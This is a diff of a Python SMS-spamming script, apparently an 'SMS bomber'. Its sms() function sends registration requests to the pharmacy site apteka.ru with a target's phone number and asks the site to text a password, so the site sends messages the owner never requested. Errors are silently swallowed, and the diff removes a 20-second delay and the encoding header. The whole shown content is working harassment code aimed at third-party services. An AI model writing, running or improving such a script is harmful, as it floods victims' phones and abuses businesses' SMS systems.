@@ -1,4 +1,3 @@
-# -*- coding: utf-8 -*-
 import requests
 import time
 import colorama
@@ -710,7 +709,6 @@ def sms():
       requests.post("https://apteka.ru/_action/auth/getForm/", data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "", "form[EMAIL]": "", "form[LOGIN]": phonee, "form[PASSWORD]": "QPromes24", "get-new-password": "Получите пароль по SMS", "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple", "utc_offset": "120"})
     except:
       pass
-    time.sleep(20)
     os.system('cls' if os.name=='nt' else 'clear')
     print (logo)
     print ('[*] Спамер завершён')
